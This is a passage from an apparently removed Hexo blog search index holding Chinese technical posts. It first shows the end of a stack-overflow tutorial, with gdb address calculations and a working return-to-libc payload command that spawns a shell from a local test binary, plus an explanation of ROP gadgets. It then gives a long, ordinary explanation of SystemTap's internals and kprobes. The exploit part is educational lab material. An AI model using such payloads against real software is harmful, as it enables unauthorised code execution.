class="variable">$1</span> = <span class="number">0</span>xf7e36f70</span><br><span class="line">(gdb) p/x <span class="number">0</span>xf7df8000 + <span class="number">0</span>x000327a0</span><br><span class="line"><span class="variable">$2</span> = <span class="number">0</span>xf7e2a7a0</span><br><span class="line">(gdb) p/x <span class="number">0</span>xf7df8000 + <span class="number">0</span>x180015</span><br><span class="line"><span class="variable">$3</span> = <span class="number">0</span>xf7f78015</span><br></pre></td></tr></table></figure>
-
-<p>然后对应着前面的图，填充地址就可以执行了：</p>
-<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="variable">$</span> ./a.out <span class="variable">$</span>(python <span class="literal">-c</span> <span class="string">&#x27;print &quot;A&quot; * 140 + &quot;\x70\x6f\xe3\xf7&quot; + &quot;\xa0\xa7\xe2\xf7&quot; + &quot;\x15\x80\xf7\xf7&quot; + &quot;\0\0\0\0&quot;&#x27;</span>)</span><br><span class="line">argv[<span class="number">1</span>]: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAApo���������</span><br><span class="line">sh<span class="literal">-4</span>.<span class="number">2</span><span class="comment">#  #进入shell啦</span></span><br></pre></td></tr></table></figure>
-
-<p>这里的A*140，是因为从buffer的起始地址到ret返回地址有140个字节的长度（具体计算可参考上一篇有关shellcode的文章）。</p>
-<blockquote>
-<p>这里需要注意的是，如果地址中出现0a，比如0xf7f70aa0，为\xa0\x0a\xf7\xf7，在这里\x0a在命令行参数中代表换行符\n，所以会截断字符，这是就需要替换掉这个地址，找其他函数或者字符串。如果是\x20，代表回车，需要用双引号括起来。</p>
-</blockquote>
-<p><code>Return to libc</code>方法的不足之处在于，如果开启了ASLR，那么我们就没法事先确定动态库的加载位置了。</p>
-<p>另外还有一种方法叫<code>Return to PLT</code>，PLT在我的<a href="https://harpersu00.github.io/1e59798b.html">GOT表劫持</a>这篇文章中有介绍，是在懒加载的时候使用的，如果程序已经调用过了这个动态库函数，那么可以直接通过PLT调用，不需要知道它的实际地址。</p>
-<h2 id="ROP-Return-Oriented-Programming"><a href="#ROP-Return-Oriented-Programming" class="headerlink" title="ROP (Return Oriented Programming)"></a>ROP (Return Oriented Programming)</h2><p>在<code>Return to libc</code>中我们直接找的函数地址，我们也可以将函数拆成几条指令组成的以<code>ret</code>指令结尾的小代码片段的集合，来执行，这就是ROP。（Return to libc其实就是ROP中的一个特例）</p>
-<p>这些小的以<code>ret</code>指令结尾的代码片段，被称之为<code>ROP gadget</code>。（之所以是ret结尾，是因为ret之后会从栈中读取下一个返回地址（gadget），然后继续执行，这样才可以把gadget拼接到一起）</p>
-<p>多个<code>ROP gadget</code>拼接成的可执行片段称为ROP链。</p>
-<p>在栈上填充的用于执行ROP链的数据，成为<code>ROP Payload</code>。</p>
-<blockquote>
-<p>ROP是使用以ret结尾的片段。</p>
-<p>使用以jmp结尾的片段叫做JOP，<code>pop esi; jmp dword[esi+0x10]</code></p>
-<p>以call结尾的片段叫做COP，<code>mov eas, dword[esp+0x20]; call dwork[eax+0x20]</code></p>
-<p>（JOP和COP有时也被合并到ROP中）</p>
-</blockquote>
-<p>ROP Gadget现在已经有很多成熟的搜索工具，比较常用的是<a href="https://github.com/JonathanSalwan/ROPgadget">ROPGadget</a>。</p>
-<p>关于ROP的具体利用方式请查看下一篇文章<a href="">栈溢出之 ROP（二）</a></p>
-]]></content>
-      <categories>
-        <category>漏洞利用</category>
-      </categories>
-  </entry>
-  <entry>
-    <title>Linux 动态调试之 SystemTap（原理篇）</title>
-    <url>/1bc0f92f.html</url>
-    <content><![CDATA[<p>Solaris 系统的DTrace是动态跟踪，动态调试技术的鼻祖，很多系统都有dtrace，比如Windows，macOS。它的运行是常驻在内核中通用用户执行的dtrace命令，把由D语言编写的脚本，提交到内核中的运行时执行。但是DTrace本身无法在linux中运行。于是大家开始尝试将DTrace移植到Linux，或者说让Linux也拥有像dtrace这样强大的动态调试工具，其中最著名的就是RedHat的SystemTap。</p>
-<a id="more"></a>
-
-<blockquote>
-<p>另外，在Linux 4.9-rc1之后，出现了另一个强有力的工具BPF（The Berkeley Packet Filter），以及扩展后的eBPF，从某种程度上来说，更接近DTrace的动态追踪机制。eBPF已经被4.x版本及之后的内核集成了，它是一个持续在内核态运行的，解释执行字节码的虚拟机，编译成ebpf字节码，比编译内核模块要快得多。（是的，SystemTap就是编译的内核模块）</p>
-</blockquote>
-<p>SystemTap运行流程：</p>
-<p><img src="/images/2020-12-07-Linux-%E5%8A%A8%E6%80%81%E8%B0%83%E8%AF%95-%E4%B9%8B-SystemTap%EF%BC%88%E5%8E%9F%E7%90%86%E7%AF%87%EF%BC%89/stap_flow_diagram.png"></p>
-<p>如上图所示，我们使用SystemTap时，虽然编写的是.stp文件，使用的是stp自己的语言（类似于脚本语言和C语言），但systemtap会将这些代码翻译成C代码，再将C代码编译为内核模块.ko，最后加载内核模块。</p>
-<blockquote>
-<p>前4个阶段和后面3个阶段可以不在同一台机器上，即在开发机器上编译内核模块，在目标机器上运行（但内核版本要一致）。</p>
-<p>stap 使用命令选项-p 序号，可以使systemtap在特定阶段停下来，比如stap -p3, 会在生成C代码之后停下来。</p>
-</blockquote>
-<h2 id="Parse（词法语法分析）"><a href="#Parse（词法语法分析）" class="headerlink" title="Parse（词法语法分析）"></a>Parse（词法语法分析）</h2><p>这部分以及下一步跟普通的程序编译过程是一样的，parse阶段主要是解析stp代码，生成AST树（抽象语法树，Abstract Syntax Tree），检查语法错误。</p>
-<h2 id="Elaborate（语义分析）"><a href="#Elaborate（语义分析）" class="headerlink" title="Elaborate（语义分析）"></a>Elaborate（语义分析）</h2><p>elaborate阶段对生成的这颗AST树进行修剪，其中又包括很多小阶段。每个小阶段都会遍历整棵树，处理每个节点。主要包括stp语言宏的展开，查找stp函数的定义，匹配stp变量类型，<strong>debuginfo相关操作</strong>，符号解析，优化器等等(可以通过选项-u跳过优化阶段)。</p>
-<p>这一阶段会用到systemtap的tapset（模块集合），路径是<code>/usr/local/share/systemtap/tapset</code>，所以这个路径里的函数可以直接拿来用。tapset包含了很多systemtap预定义的事件或函数，比如通用的查询表，受限内存管理，I/O操作等等。虽然也是stp文件，但只能作为库使用，不能直接运行。也会查找debuginfo中对应函数/变量/路径等的偏移地址。</p>
-<h2 id="Translate（生成C代码）"><a href="#Translate（生成C代码）" class="headerlink" title="Translate（生成C代码）"></a>Translate（生成C代码）</h2><p>我们使用以下代码，来简单看一下stp编译后的C代码是怎样的。</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">global</span> g_s</span><br><span class="line">probe begin &#123;</span><br><span class="line">    a=<span class="number">1</span></span><br><span class="line">    printf(<span class="string">&quot;Hi %d&quot;</span>, a)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">probe oneshot &#123;</span><br><span class="line">    printf(<span class="string">&quot;I&#x27;m in&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">probe timer.ms(<span class="number">100</span>) &#123;</span><br><span class="line">    printf(<span class="string">&quot;timer&quot;</span>)</span><br><span class="line">    exit()</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">probe end &#123;</span><br><span class="line">    g_s = <span class="string">&quot;now&quot;</span></span><br><span class="line">    printf(<span class="string">&quot;end %s&quot;</span>, g_s)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">probe process(<span class="string">&quot;/lib64/libc.so.6&quot;</span>).function(<span class="string">&quot;gethostbyname&quot;</span>).<span class="keyword">return</span> &#123;</span><br><span class="line">    printf(<span class="string">&quot;uprobe_gethostbyname&quot;</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>使用命令<code>stap -v test.stp -p3 &gt; test.c</code>，可以查看编译后生成的C文件。</p>
-<h3 id="变量"><a href="#变量" class="headerlink" title="变量"></a>变量</h3><p>代码部分，首先我们看到的是一个contest的结构体：</p>
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">context</span> &#123;</span></span><br><span class="line">  <span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;common_probe_context.h&quot;</span></span></span><br><span class="line">  <span class="keyword">union</span> &#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">probe_8187_locals</span> &#123;</span></span><br><span class="line">      <span class="keyword">int64_t</span> l_a;</span><br><span class="line">      <span class="keyword">union</span> &#123; <span class="comment">/* block_statement: ./test.stp:2 */</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> &#123;</span> <span class="comment">/* source: ./test.stp:4 */</span></span><br><span class="line">          <span class="keyword">int64_t</span> __tmp2;</span><br><span class="line">        &#125;;</span><br><span class="line">      &#125;;</span><br><span class="line">    &#125; probe_8187;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">probe_8189_locals</span> &#123;</span></span><br><span class="line">      <span class="keyword">union</span> &#123; <span class="comment">/* block_statement: ./test.stp:7 */</span></span><br><span class="line">      &#125;;</span><br><span class="line">    &#125; probe_8189;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">probe_8190_locals</span> &#123;</span></span><br><span class="line">      <span class="keyword">union</span> &#123; <span class="comment">/* block_statement: ./test.stp:11 */</span></span><br><span class="line">      &#125;;</span><br><span class="line">    &#125; probe_8190;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">probe_8191_locals</span> &#123;</span></span><br><span class="line">      <span class="keyword">union</span> &#123; <span class="comment">/* block_statement: ./test.stp:16 */</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> &#123;</span> <span class="comment">/* source: ./test.stp:18 */</span></span><br><span class="line">          <span class="keyword">string_t</span> __tmp2;</span><br><span class="line">        &#125;;</span><br><span class="line">      &#125;;</span><br><span class="line">    &#125; probe_8191;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">probe_8193_locals</span> &#123;</span></span><br><span class="line">    &#125; probe_8193;</span><br><span class="line">  &#125; probe_locals;</span><br><span class="line">  <span class="keyword">union</span> &#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">function___global_exit__overload_0_locals</span> &#123;</span></span><br><span class="line">      <span class="comment">/* no return value */</span></span><br><span class="line">    &#125; function___global_exit__overload_0;</span><br><span class="line">  &#125; locals [MAXNESTING+<span class="number">1</span>];</span><br><span class="line">  <span class="meta">#<span class="meta-keyword">if</span> MAXNESTING &lt; 0</span></span><br><span class="line">  <span class="meta">#<span class="meta-keyword">error</span> <span class="meta-string">&quot;MAXNESTING must be positive&quot;</span></span></span><br><span class="line">  <span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">  <span class="meta">#<span class="meta-keyword">ifndef</span> STP_LEGACY_PRINT</span></span><br><span class="line">  <span class="keyword">union</span> &#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">stp_printf_1_locals</span> &#123;</span></span><br><span class="line">      <span class="keyword">int64_t</span> arg0;</span><br><span class="line">    &#125; stp_printf_1;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">stp_printf_2_locals</span> &#123;</span></span><br><span class="line">      <span class="keyword">const</span> <span class="keyword">char</span>* arg0;</span><br><span class="line">    &#125; stp_printf_2;</span><br><span class="line">  &#125; printf_locals;</span><br><span class="line">  <span class="meta">#<span class="meta-keyword">endif</span> <span class="comment">// STP_LEGACY_PRINT</span></span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
-
-<p>context这个结构体是在执行各个probe前后被复用的，因为一个context在某个时刻只能处于一个porbe中，所以采用了union来减少内存以及内核的栈空间，将内存设置为probe所用到的最大的变量数。<code>struct probe_xxx_locals</code>用来存储每个probe对应的本地变量。每个本地变量都被加了前缀l_，比如示例中的<code>int64_t l_a</code>。</p>
-<p>long类型的变量会被编译为int64_t，即使是在32位系统上，其实也是64位整数。string类型的变量会被编译为string_t，这是<code>char[MAXSTRINGLEN]</code>的别名，也就是string的大小其实是固定的，当实际数据大于MAXSTRINGLEN时，会被截断，同样，跟字符型数组一样，当数据中存在<code>\0</code>时，也会被截断。</p>
-<p>跟本地变量不同，全局变量有自己独立的结构体：</p>
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">stp_globals</span> &#123;</span></span><br><span class="line">  <span class="keyword">string_t</span> s___global_g_s;</span><br><span class="line">  <span class="keyword">rwlock_t</span> s___global_g_s_lock;</span><br><span class="line">  <span class="meta">#<span class="meta-keyword">ifdef</span> STP_TIMING</span></span><br><span class="line">  <span class="keyword">atomic_t</span> s___global_g_s_lock_skip_count;</span><br><span class="line">  <span class="keyword">atomic_t</span> s___global_g_s_lock_contention_count;</span><br><span class="line">  <span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">//这里是一个stub</span></span><br><span class="line"><span class="keyword">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">stp_globals</span> <span class="title">stp_global</span> = &#123;</span></span><br><span class="line">  </span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
-
-<p>全局变量会被加上<code>s_global_xx</code>前缀，而且定义了对应lock。全局变量在使用的时候，都会加上对应的锁。</p>
-<h3 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h3><p>对于probe begin/oneshot/end部分的结构都差不多，以下是probe begin处的代码：</p>
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">probe_8187</span> <span class="params">(struct context * __restrict__ c)</span> </span>&#123;</span><br><span class="line">  __label__ deref_fault;</span><br><span class="line">  __label__ out;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">probe_8187_locals</span> * __<span class="title">restrict__</span> <span class="title">l</span> = &amp; <span class="title">c</span>-&gt;<span class="title">probe_locals</span>.<span class="title">probe_8187</span>;</span></span><br><span class="line">  (<span class="keyword">void</span>) l;</span><br><span class="line">  l-&gt;l_a = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> (c-&gt;actionremaining &lt; <span class="number">2</span>) &#123; c-&gt;last_error = <span class="string">&quot;MAXACTION exceeded&quot;</span>; <span class="keyword">goto</span> out; &#125;</span><br><span class="line">  &#123;</span><br><span class="line">    (<span class="keyword">void</span>) </span><br><span class="line">    (&#123;</span><br><span class="line">      l-&gt;l_a = ((<span class="keyword">int64_t</span>)<span class="number">1L</span>L);</span><br><span class="line">      ((<span class="keyword">int64_t</span>)<span class="number">1L</span>L);</span><br><span class="line">    &#125;);</span><br><span class="line">    </span><br><span class="line">    (<span class="keyword">void</span>) </span><br><span class="line">    (&#123;</span><br><span class="line">      l-&gt;__tmp2 = l-&gt;l_a;</span><br><span class="line">      #ifndef STP_LEGACY_PRINT</span><br><span class="line">        c-&gt;printf_locals.stp_printf_1.arg0 = l-&gt;__tmp2;</span><br><span class="line">        stp_printf_1 (c);</span><br><span class="line">      #<span class="keyword">else</span> <span class="comment">// STP_LEGACY_PRINT</span></span><br><span class="line">        _stp_printf (<span class="string">&quot;Hi %lld&quot;</span>, l-&gt;__tmp2);</span><br><span class="line">      #endif <span class="comment">// STP_LEGACY_PRINT</span></span><br><span class="line">      <span class="keyword">if</span> (unlikely(c-&gt;last_error || c-&gt;aborted)) <span class="keyword">goto</span> out;</span><br><span class="line">      ((<span class="keyword">int64_t</span>)<span class="number">0L</span>L);</span><br><span class="line">    &#125;);</span><br><span class="line">    </span><br><span class="line">  &#125;</span><br><span class="line">deref_fault: __attribute__((unused));</span><br><span class="line">out:</span><br><span class="line">  _stp_print_flush();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p><code>printf</code>语句被转换成对应的内置函数调用，且代码块前后都加上了括号和花括号，防止代码污染。<code>MAXACTION exceeded</code>部分是为了限制probe的执行时间的，每个probe都有这段代码，避免出现超时导致的内核失去响应的情况。<code>probe oneshot</code>会在<code>_stp_sprint</code>代码块之后多调用一个<code>function___global_exit__overload_0</code>函数，这个函数内部调用了<code>_stp_exit</code>函数。</p>
-<p>在systemtap运行时的begin和end阶段，也就是<code>systemtap_module_init</code>和<code>systemtap_module_exit</code>两个函数调用时，会调用<code>enter_be_probe</code>函数，这个函数会通过<code>struct stap_be_probe</code>中的实例，在<code>(*stp-&gt;probe-&gt;ph)(c)</code>这一行调用对应probe的handler。probe begin/oneshot/end都会注册在<code>struct stap_be_probe</code>结构中。</p>
-<p>所以当systemtap启动时，会调用probe begin/oneshot，区别是oneshot会调用<code>_stp_exit</code>函数，表明将要进入end阶段了，然后在end阶段会调用probe end。</p>
-<p>相比于前面三个probe对应的<code>struct stap_be_probe</code>结构，probe timer对应的是<code>struct stap_hrtimer_probe</code>，然后在<code>systemtap_module_init</code>函数中会注册timer。</p>
-<p>对于process probe，对应的类型是<code>struct stapiu_consumer</code>：</p>
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">stapiu_consumer</span> <span class="title">stap_inode_uprobe_consumers</span>[] = &#123;</span></span><br><span class="line">  &#123; .return_p=<span class="number">1</span>, .target=&amp;stap_inode_uprobe_targets[<span class="number">0</span>], .offset=(<span class="keyword">loff_t</span>)<span class="number">0x119230</span>ULL, .probe=(&amp;stap_probes[<span class="number">4</span>]), &#125;,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
-
-<p>这里有一个<code>.offset=(loff_t)0x119230ULL</code>的值，就是<code>gethostbyname</code>函数在process<code>/lib64/libc.so.6</code>（实际指向<code>/usr/lib64/libc-2.17.so</code>）中的偏移。可以通过命令<code>readelf -f /usr/lib64/libc-2.17.so | grep gethostbyname</code> 查看。这也是编译期间为什么需要debuginfo，这样才可以找到函数对应的偏移地址，然后加上库的基地址，就是实际运行地址了。</p>
-<p>systemtap会检查已存在以及新创建的进程，如果有匹配某个probe，则会通过内核API注册对应的probe，然后内核触发回调时，就会执行这个函数。所以，每个匹配的进程都会执行probe。</p>
-<p>如果需要指定进程的话，可以使用-x PID（会赋值给 target() ），或者-c CMD（新建子进程作为target()）：</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">_target = target()</span><br><span class="line"><span class="keyword">if</span> (pid() != _target) &#123;</span><br><span class="line">    next</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<h2 id="Build（编译成内核模块-ko）"><a href="#Build（编译成内核模块-ko）" class="headerlink" title="Build（编译成内核模块.ko）"></a>Build（编译成内核模块.ko）</h2><p>前面三个阶段已经生成了c文件，但其中有关于tapset的函数只是做了简单的链接（函数路径），比如：</p>
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">c-&gt;last_stmt = <span class="string">&quot;identifier &#x27;exit&#x27; at /usr/local/share/systemstap/tapset/logging.stp:63:10&quot;</span>;</span><br></pre></td></tr></table></figure>
-
-<p>在这个阶段，会将这部分一起编译到最终的内核模块里。</p>
-<h2 id="Load-Run（加载运行）"><a href="#Load-Run（加载运行）" class="headerlink" title="Load/Run（加载运行）"></a>Load/Run（加载运行）</h2><p>这部分是通过独立的二进制文件staprun实现的，这可以将编译跟运行环境分开。在<code>staprun/staprun_funcs.c</code>文件中，<code>insert_module</code>函数通过调用系统API<code>init_module</code>，来加载内核模块。</p>
-<p>内核模块探测点的处理函数被封装成接口函数，底层调用Linux提供的kprobe接口函数来注册探测点。静态指针使用tracepoints，动态指针使用kprobe，用户态使用uprobes。</p>
-<p>Kprobes是kernel probes，主要有三类，kprobe、kreprobe、jprobe（最新的内核中已经被去掉了）。kprobe是最常使用的，可以在任何指令位置处插入探针。kretprobe可以查看函数执行结束后的参数变化，jprobe在函数进入时使用，类似于kprobe的pre_hanlder。</p>
-<p>kretprobe用trampoline地址替换堆栈上的返回地址。因此当对应函数返回时，会先执行kretprobe设置的trampoline，然后再从trampoline返回到原来的返回地址。</p>
-<p>kprobe的运行原理跟GDB很类似，也是基于中断处理的。系统初始化的时候会注册中断处理，在x86系统上分别是<code>int 1</code>和<code>int 3</code>两个trap，对应的函数是<code>do_debug</code>以及<code>do_int3</code>。 在arm64中是BRK（异常处理）指令。</p>
-<p><img src="/images/2020-12-07-Linux-%E5%8A%A8%E6%80%81%E8%B0%83%E8%AF%95-%E4%B9%8B-SystemTap%EF%BC%88%E5%8E%9F%E7%90%86%E7%AF%87%EF%BC%89/kprobe.png"></p>
-<p>kprobe的运行流程：</p>
-<ul>
-<li>注册kprobe。一个kprobe结构体对应一个探针，包含有插入点地址，以及保存该插入点的原始指令original_opcode</li>
-<li>替换原有指令。将插入点的指令替换为0xcc(int 3, ARM替换为BRK)。这样当CPU执行到该位置时，就会触发int 3或异常处理。</li>
-<li>进入异常态执行pre_handler。找到该位置信息对应的kprobe，执行pre_handler。并将相应寄存器设置成单步调试single-step，将下一条指令设置为original_opcode，然后从异常态返回。</li>
-<li>再次陷入异常态执行post_handler。因为在上一步将下一条即将执行的指令设置为了original_opcode，且设置了single-step。因此从int 3返回后会立即执行原有指令，紧接着触发int 1(single-step)，再次进入异常态。这时首先清除single-step相关的寄存器tag，然后执行kprobe的post_handler，最后从异常态安全返回。</li>
-</ul>
-<p>以上就是kprobe执行过程，就是将原有的一条指令扩展成为<strong>执行pre_handler-&gt;执行原有指令-&gt;执行post_handler</strong>。</p>
-<p>systemtap就是调用的kprobe接口函数来注册stp脚本中定义的探测点。当内核运行到探测点时，就会调用对应的处理函数，其中的输出语句将会通过调用<code>relayfs</code>的接口函数输出数据，也就是下一步的通讯过程。</p>
-<h2 id="Store-Output（用户态-内核态交互，通讯）"><a href="#Store-Output（用户态-内核态交互，通讯）" class="headerlink" title="Store Output（用户态/内核态交互，通讯）"></a>Store Output（用户态/内核态交互，通讯）</h2><p>staprun加载内核模块之后，会exec一个stapio进程（<code>/usr/libexec/systemtap/</code>），跟加载后的内核模块通讯。内核模块会通过<code>debugfs_create_dir</code>和<code>debugfs_create_file</code>两个api创建一个<code>debugfs</code>下的“伪文件”。用户态程序可以通过读写这些“伪文件”来调用内核模块的制定函数。内核模块会创建<code>/sys/kernel/debug/systemtap/$module_name/trace%d</code>这样的文件用于数据流的传输。</p>
-<p>stapio（用户态程序）跟内核模块交互，其实就是对文件进行读写。在<code>int stp_main_loop(void)</code>函数中会对不同的控制指令进行处理，<code>_stp_ctl_wire_cmd</code>函数中有对应的控制指令在内核态部分的处理逻辑。</p>
-<h2 id="Stop-Unload（卸载）"><a href="#Stop-Unload（卸载）" class="headerlink" title="Stop/Unload（卸载）"></a>Stop/Unload（卸载）</h2><p>当满足以下两个条件之一时，straprun就会卸载内核模块：</p>
-<ul>
-<li>stap脚本执行到exit()函数</li>
-<li>向stapio发送信号（比如ctrl+c）</li>
-</ul>
-<p>内核模块将要退出时（遇到exit()函数），会将<code>STP_REQUEST_EXIT</code>控制消息写入伪文件.cmd的buffer中。stapio读取控制流时，看到这个消息，就会相应对应的<code>STP_EXIT</code>。然后内核看到<code>STP_EXIT</code>消息，就会做相应的清理工作，之后再返回<code>STP_EXIT</code>给stapio。stapio接收到这个消息之后就会卸载内核模块。</p>
-<p>如果是stapio收到退出信号（ctrl+c），就会向内核模块发送<code>STP_EXIT</code>消息，然后再卸载内核模块。</p>
-<p>卸载内核模块是stapio通过创建执行卸载操作的staprun进程实行的，所以stapio实际还是只负责通讯。</p>
-<hr>
-<p>最后我们通过下面这张图来回顾一下systemtap的工作流程：</p>
-<p><img src="/images/2020-12-07-Linux-%E5%8A%A8%E6%80%81%E8%B0%83%E8%AF%95-%E4%B9%8B-SystemTap%EF%BC%88%E5%8E%9F%E7%90%86%E7%AF%87%EF%BC%89/systemtap-how-works.png"></p>
-<p>其中DWARF是指Linux的调试符号表格式。</p>
-<p>有关systemtap的具体安装、使用、如何编写stp脚本等问题，请见我的下一篇文章<a href="">Linux 动态调试之 SystemTap（使用篇</a>）。</p>
-<h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p>[1] systemtap 探秘（一）- 基本介绍　<a href="https://segmentfault.com/a/1190000019566831">https://segmentfault.com/a/1190000019566831</a>  </p>
-<p>[2] systemtap原理及使用　<a href="https://www.bbsmax.com/A/A7zgmEOP54/">https://www.bbsmax.com/A/A7zgmEOP54/</a>  </p>
-<p>[3] SystemTap Kprobe原理　<a href="https://lzz5235.github.io/2013/12/18/systemtap-kprobe.html">https://lzz5235.github.io/2013/12/18/systemtap-kprobe.html</a>  </p>
-<p>[4] 3.1 Systemp 简介　<a href="https://hotttao.github.io/2020/01/08/linux_perf/11_stap%E7%AE%80%E4%BB%8B/">https://hotttao.github.io/2020/01/08/linux_perf/11_stap%E7%AE%80%E4%BB%8B/</a></p>
-<p>[5] kprobe原理解析（二）　<a href="https://www.cnblogs.com/honpey/p/4575902.html">https://www.cnblogs.com/honpey/p/4575902.html</a></p>
-]]></content>
-      <categories>
-        <category>一些Tools</category>
       </categories>
   </entry>
 </search>
